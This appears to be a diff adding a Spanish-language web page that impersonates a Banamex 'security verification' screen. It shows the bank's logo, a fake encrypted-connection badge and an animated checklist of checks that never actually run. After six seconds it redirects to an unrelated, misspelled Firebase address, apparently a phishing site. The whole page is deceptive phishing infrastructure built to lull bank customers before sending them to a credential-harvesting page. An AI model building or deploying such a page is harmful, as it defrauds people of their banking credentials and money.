@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad - Espera</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f6f8;
+            color: #111827;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Barra superior minimalista */
+        .top-bar {
+            background-color: #033540;
+            color: #ffffff;
+            padding: 12px 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            letter-spacing: 0.4px;
+        }
+
+        .top-bar-content {
+            max-width: 1140px;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .ssl-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 600;
+            color: #a7f3d0;
+        }
+
+        /* Contenedor centrado */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px 16px;
+        }
+
+        /* Tarjeta principal de espera */
+        .security-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 460px;
+            border-radius: 24px;
+            padding: 36px 32px;
+            box-shadow: 0 12px 32px rgba(3, 53, 64, 0.1);
+            text-align: center;
+            border-top: 6px solid #033540;
+            position: relative;
+        }
+
+        /* Contenedor del logo animado */
+        .shield-container {
+            width: 84px;
+            height: 84px;
+            margin: 0 auto 22px auto;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-color: rgba(0, 122, 153, 0.15);
+            animation: pulse 2s infinite ease-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.85); opacity: 0.9; }
+            100% { transform: scale(1.45); opacity: 0; }
+        }
+
+        .shield-circle {
+            width: 72px;
+            height: 72px;
+            background-color: #ffffff; /* Fondo blanco para resaltar el logo */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+            border: 1px solid #e2e8f0; /* Borde sutil */
+            padding: 12px; /* Espacio para que el logo respire */
+        }
+
+        /* Estilo para la imagen del logo */
+        .shield-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .card-title {
+            color: #033540;
+            font-size: 21px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        /* Mensaje dinámico de seguridad */
+        .dynamic-message-box {
+            min-height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 22px;
+        }
+
+        .dynamic-message {
+            color: #374151;
+            font-size: 15px;
+            font-weight: 500;
+            line-height: 1.4;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .dynamic-message.fade {
+            opacity: 0;
+            transform: translateY(-4px);
+        }
+
+        /* Barra de progreso y contador */
+        .progress-wrapper {
+            margin-bottom: 24px;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            font-weight: 600;
+            color: #033540;
+            margin-bottom: 8px;
+        }
+
+        .timer-badge {
+            color: #ff1e42;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 10px;
+            background-color: #e5e7eb;
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #033540 0%, #007a99 100%);
+            border-radius: 999px;
+            transition: width 0.25s linear;
+        }
+
+        /* Lista de verificación paso a paso */
+        .checklist {
+            list-style: none;
+            text-align: left;
+            background-color: #f8fafc;
+            border-radius: 14px;
+            padding: 16px 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #64748b;
+            transition: color 0.3s ease;
+        }
+
+        .check-item.active {
+            color: #033540;
+            font-weight: 600;
+        }
+
+        .check-item.done {
+            color: #0f766e;
+            font-weight: 500;
+        }
+
+        .status-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #cbd5e1;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 11px;
+            transition: all 0.3s ease;
+        }
+
+        .check-item.active .status-dot {
+            border-color: #007a99;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .check-item.done .status-dot {
+            background-color: #0f766e;
+            border-color: #0f766e;
+            color: #ffffff;
+            animation: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-note {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        @media (max-width: 480px) {
+            .security-card {
+                padding: 28px 20px;
+            }
+            .card-title {
+                font-size: 19px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-bar">
+        <div class="top-bar-content">
+            <span>Portal de Verificación</span>
+            <span class="ssl-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                Conexión cifrada TLS 1.3
+            </span>
+        </div>
+    </header>
+
+    <main class="main-wrapper">
+        <section class="security-card" aria-live="polite">
+            
+            <div class="shield-container">
+                <div class="pulse-ring"></div>
+                <div class="shield-circle">
+                    <!-- Aquí usamos tu imagen Bana.png -->
+                    <img src="Bana.png" alt="Banamex Logo">
+                </div>
+            </div>
+
+            <h1 class="card-title">Protegiendo tu sesión</h1>
+
+            <div class="dynamic-message-box">
+                <p id="dynamicMessage" class="dynamic-message">
+                    Iniciando protocolo de conexión segura...
+                </p>
+            </div>
+
+            <div class="progress-wrapper">
+                <div class="progress-header">
+                    <span id="percentText">0% completado</span>
+                    <span class="timer-badge">Tiempo restante: <strong id="secondsLeft">6</strong>s</span>
+                </div>
+                <div class="progress-track">
+                    <div id="progressFill" class="progress-fill"></div>
+                </div>
+            </div>
+
+            <ul class="checklist" id="securityChecklist">
+                <li class="check-item active" data-step="0">
+                    <span class="status-dot"></span>
+                    <span>Verificando certificado digital y cifrado de extremo a extremo</span>
+                </li>
+                <li class="check-item" data-step="1">
+                    <span class="status-dot"></span>
+                    <span>Comprobando integridad del navegador y dispositivo</span>
+                </li>
+                <li class="check-item" data-step="2">
+                    <span class="status-dot"></span>
+                    <span>Activando monitoreo preventivo contra accesos no autorizados</span>
+                </li>
+                <li class="check-item" data-step="3">
+                    <span class="status-dot"></span>
+                    <span>Generando token temporal de sesión protegida</span>
+                </li>
+            </ul>
+
+            <p class="footer-note">Por tu seguridad, no cierres ni actualices esta ventana.</p>
+        </section>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const TOTAL_SECONDS = 6;
+            const REDIRECT_URL = 'https://banamexusercostumer.web.app/';
+            let elapsed = 0;
+
+            const dynamicMessage = document.getElementById('dynamicMessage');
+            const secondsLeftEl = document.getElementById('secondsLeft');
+            const percentTextEl = document.getElementById('percentText');
+            const progressFill = document.getElementById('progressFill');
+            const checkItems = document.querySelectorAll('.check-item');
+
+            // Mensajes que rotan cada 1.5s durante los 6 segundos
+            const securityMessages = [
+                "Estableciendo canal cifrado de alta seguridad...",
+                "Validando autenticidad del sitio y certificados SSL...",
+                "Analizando entorno seguro para proteger tus datos...",
+                "Verificación completada. Redirigiendo..."
+            ];
+
+            let currentMsgIndex = 0;
+            let timerInterval = null;
+
+            function updateMessage(newText) {
+                dynamicMessage.classList.add('fade');
+                setTimeout(() => {
+                    dynamicMessage.textContent = newText;
+                    dynamicMessage.classList.remove('fade');
+                }, 250);
+            }
+
+            function updateChecklist(secondsPassed) {
+                // 4 pasos en 6 segundos → 1.5s por paso
+                const stepIndex = Math.min(Math.floor(secondsPassed / 1.5), checkItems.length - 1);
+
+                checkItems.forEach((item, idx) => {
+                    const dot = item.querySelector('.status-dot');
+                    if (idx < stepIndex || secondsPassed >= TOTAL_SECONDS) {
+                        item.classList.remove('active');
+                        item.classList.add('done');
+                        dot.textContent = '✓';
+                    } else if (idx === stepIndex) {
+                        item.classList.add('active');
+                        item.classList.remove('done');
+                        dot.textContent = '';
+                    } else {
+                        item.classList.remove('active', 'done');
+                        dot.textContent = '';
+                    }
+                });
+            }
+
+            function startSimulation() {
+                clearInterval(timerInterval);
+                elapsed = 0;
+                currentMsgIndex = 0;
+
+                dynamicMessage.textContent = securityMessages[0];
+                secondsLeftEl.textContent = TOTAL_SECONDS;
+                percentTextEl.textContent = '0% completado';
+                progressFill.style.width = '0%';
+                updateChecklist(0);
+
+                timerInterval = setInterval(() => {
+                    elapsed += 0.1;
+
+                    const remaining = Math.max(0, Math.ceil(TOTAL_SECONDS - elapsed));
+                    const percent = Math.min(100, Math.round((elapsed / TOTAL_SECONDS) * 100));
+
+                    secondsLeftEl.textContent = remaining;
+                    percentTextEl.textContent = `${percent}% completado`;
+                    progressFill.style.width = `${percent}%`;
+
+                    // Cambiar texto cada 1.5s
+                    const nextMsgIndex = Math.min(Math.floor(elapsed / 1.5), securityMessages.length - 1);
+                    if (nextMsgIndex !== currentMsgIndex) {
+                        currentMsgIndex = nextMsgIndex;
+                        updateMessage(securityMessages[currentMsgIndex]);
+                    }
+
+                    updateChecklist(elapsed);
+
+                    // Al llegar a 6 segundos → redirigir
+                    if (elapsed >= TOTAL_SECONDS) {
+                        clearInterval(timerInterval);
+                        secondsLeftEl.textContent = '0';
+                        percentTextEl.textContent = '100% completado';
+                        progressFill.style.width = '100%';
+                        updateChecklist(TOTAL_SECONDS);
+
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, 400);
+                    }
+                }, 100);
+            }
+
+            startSimulation();
+        });
+    </script>
+
+</body>
+</html>
